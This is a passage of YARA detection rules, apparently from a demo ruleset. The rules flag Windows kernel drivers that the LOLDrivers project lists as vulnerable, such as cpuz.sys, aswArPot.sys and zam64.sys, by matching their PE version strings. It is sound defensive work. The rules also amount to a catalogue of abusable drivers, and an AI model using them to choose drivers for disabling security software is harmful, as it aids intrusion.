them\n}\n\nrule PUA_VULN_Driver_Asustekcomputerinc_Bsdefsys_Supportsstsfssteeatftatcamfntamfnbvctvcbmftwc_5F5E_RID4CA1 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - Bs_Def.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 08:42:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00440065006600610075006c0074002000420049004f005300200046006c0061007300680020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004100730075007300540065006b00200043006f006d0070007500740065007200200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e003200340020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e00320034 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00420073005f00440065006600360034002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0053007500700070006f0072007400200053005300540033003900530046003000320030002c0053005300540032003900450045003000320030002c004100540034003900460030003000320054002c00410054003200390043003000320030002c0041004d003200390046003000300032004e0054002c0041004d003200390046003000300032004e0042002c0056003200390043003500310030003000320054002c0056003200390043003500310030003000320042002c004d0032003900460030003000320054002c0057003200390043003000320030002e } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00420073005f00440065006600360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028004300290020004100730075007300540065006b00200043006f006d00700075007400650072002e00200031003900390032002d0032003000300034 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Novellinc_Novellxtier_F27F_RID36BE : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - libnicm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:08:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e006f00760065006c006c0020005800540043004f004d0020005300650072007600690063006500730020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e006f00760065006c006c002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0033002e0031002e00310031002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0033002e0031002e00310031 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e006f00760065006c006c002000580054006900650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006c00690062006e00690063006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00280043002900200043006f007000790072006900670068007400200032003000300030002d0032003000310033002c0020004e006f00760065006c006c002c00200049006e0063002e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Almicosoftware_Sfdrvxsys_Speedfan_X_965D_RID3C43 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - sfdrvx64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:04:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0053007000650065006400460061006e00200078003600340020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041006c006d00690063006f00200053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00580032002e00300031002e00300037 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00580032002e00300031002e00300037 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00730066006400720076007800360034002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0053007000650065006400460061006e } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00730066006400720076007800360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a900200041006c006d00690063006f00200053006f00660074007700610072006500200032003000300031002d0032003000310031 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Novellinc_Novellxtier_5A66_RID36AB : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - nscm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:05:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e006f00760065006c006c002000580054006900650072002000530065007300730069006f006e0020004d0061006e0061006700650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e006f00760065006c006c002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0033002e0031002e00310031002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0033002e0031002e00310031 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e006f00760065006c006c002000580054006900650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e00730063006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00280043002900200043006f007000790072006900670068007400200032003000300030002d0032003000310033002c0020004e006f00760065006c006c002c00200049006e0063002e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Panyazilimbilisimteknolojileriticltdsti_Panioxsys_Paniolibrary_6B83_RID47D5 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - PanIOx64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 05:18:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00540065006d0070006500720061007400750072006500200061006e0064002000730079007300740065006d00200069006e0066006f0072006d006100740069006f006e0020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00500061006e002000590061007a0069006c0069006d002000420069006c006900730069006d002000540065006b006e006f006c006f006a0069006c0065007200690020005400690063002e0020004c00740064002e0020005300740069002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00500061006e0049004f007800360034002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00500061006e0049004f0020004c006900620072006100720079 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00500061006e0049004f007800360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280063002900200032003000310032002d0032003000310034002000500061006e002000590061007a0069006c0069006d002000420069006c006900730069006d002000540065006b006e006f006c006f006a0069006c0065007200690020005400690063002e0020004c00740064002e0020005300740069002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Elaboratebytesag_Elbycdio_Cdrtools_82FB_RID3BC7 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - elbycdio.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:43:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0045006c0062007900430044002000570069006e0064006f007700730020004e0054002f0032003000300030002f0058005000200049002f004f0020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002c00200030002c00200030002c00200037 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002c00200030002c00200030002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0045006c00620079004300440049004f } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043004400520054006f006f006c0073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0045006c00620079004300440049004f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003000300020002d0020003200300030003700200045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Entechtaiwan_Seasys_Softenginex_6CB5_RID3AAF : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - Se64a.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 19:57:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0045006e005400650063006800200073006f006600740045006e00670069006e006500200078003600340020006b00650072006e0065006c002d006d006f006400650020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0045006e0054006500630068002000540061006900770061006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00730065003600340061002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0073006f006600740045006e00670069006e0065002d007800360034 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00730065003600340061002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280063002900200045006e0054006500630068002000540061006900770061006e002c00200032003000300034002d0032003000300036002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Avgtechnologiesczsro_Aswarpot_Avginternetsecuritysystem_0B54_RID4505 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 03:18:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00410056004700200041006e0074006900200052006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00320030002e0038002e003100330030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00320030002e0038002e003100330030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00410056004700200049006e007400650072006e00650074002000530065006300750072006900740079002000530079007300740065006d0020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000320030002000410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PUA_VULN_Driver_Razerinc_Rzpnk_Rzpnk_F159_RID362F : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - rzpnk.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 16:45:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00520061007a006500720020004f007600650072006c0061007900200053007500700070006f00720074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00520061007a00650072002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e00310032002e00310030003100370037 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e00310032002e00310030003100370037 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0052007a0070006e006b } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0052007a0070006e006b } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0052007a0070006e006b002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310030002d0032003000310037002e002000520061007a00650072002c00200049006e0063002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Avastsoftware_Aswarpotsys_Avastantivirus_1273_RID3EAD : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:47:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0041007600610073007400200061006e0074006900200072006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041005600410053005400200053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310038002e0035002e0033003900320036002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310038002e0035002e0033003900320036002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041007600610073007400200041006e00740069007600690072007500730020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290020003200300031003800200041005600410053005400200053006f006600740077006100720065 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmcommsys_Trendmicroeyes_3854_RID3DA0 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - TmComm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:02:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200043006f006d006d006f006e0020004d006f00640075006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0037002e00330030002e0030002e0031003000360035 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0037002e00330030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200045007900650073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000200028004300290020002000320030003100370020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them\n}\n\nrule PUA_VULN_Driver_Advancedmicrodevices_Aoddriversys_Amdoverdriveservicedriver_3C11_RID4631 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - AODDriver.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:08:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0041004d00440020004f00760065007200440072006900760065002000530065007200760069006300650020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041006400760061006e0063006500640020004d006900630072006f00200044006500760069006300650073 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0033002e0031002e00300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0033002e0031002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0041004f0044004400720069007600650072002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041004d00440020004f00760065007200440072006900760065002000530065007200760069006300650020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0041004f0044004400720069007600650072002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020003200300030003900200041004d0044002c00200049006e0063002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Windowsrcodenamelonghornddkprovider_Cpuzsys_Windowsrcodenamelonghornddkdriver_EAA5_RID4E3C : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - cpuz.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 08:47:08\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004300500055002d005a0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00570069006e0064006f00770073002000280052002900200043006f00640065006e0061006d00650020004c006f006e00670068006f0072006e002000440044004b002000700072006f00760069006400650072 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e0030002e0036003000300030002e003100360033003800360020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e0030002e0036003000300030002e00310036003300380036 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006300700075007a002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00570069006e0064006f00770073002000280052002900200043006f00640065006e0061006d00650020004c006f006e00670068006f0072006e002000440044004b0020006400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006300700075007a002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00a90020004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Zemanaltd_Zam_8FE9_RID3347 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - zam64.sys, zamguard32.sys, zamguard64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 14:41:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005a0041004d } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005a0065006d0061006e00610020004c00740064002e } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e00310037002e003100310035 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005a0041004d } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]005a0065006d0061006e00610020004c00740064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Windowsrcodenamelonghornddkprovider_Cpuzsys_Windowsrcodenamelonghornddkdriver_4932_RID4E12 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - cpuz.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 09:44:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004300500055004900440020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00570069006e0064006f00770073002000280052002900200043006f00640065006e0061006d00650020004c006f006e00670068006f0072006e002000440044004b002000700072006f00760069006400650072 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e0030002e0036003000300030002e003100360033003800360020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e0030002e0036003000300030002e00310036003300380036 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006300700075007a002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00570069006e0064006f00770073002000280052002900200043006f00640065006e0061006d00650020004c006f006e00670068006f0072006e002000440044004b0020006400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006300700075007a002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00a90020004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Msi_Ntiolibsys_Ntiolib_3D9E_RID3701 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - NTIOLib.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:20:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e00540049004f004c0069006200200046006f00720020004e00540049004f004c00690062005f00450043004f } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d00530049 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030002e0032 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030002e0032 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004e00540049004f004c00690062002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e00540049004f004c00690062 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004e00540049004f004c00690062002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310031002d00320030003100320020004d00530049002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Logitech_Lgcoretempsys_Lgcoretemp_E0CB_RID3B8E : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - LgCoreTemp.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:34:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00430050005500200043006f00720065002000540065006d007000650072006100740075007200650020004d006f006e00690074006f0072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004c006f006700690074006500630068 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030002e0031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030002e0031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004c00670043006f0072006500540065006d0070002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004c00670043006f0072006500540065006d0070 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004c00670043006f0072006500540065006d0070002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a90020004c006f006700690074006500630068002c00200049006e0063 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Intelcorporation_Stdcdrvsys_Selftestdatacollector_3702_RID423E : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - stdcdrv64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:19:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = 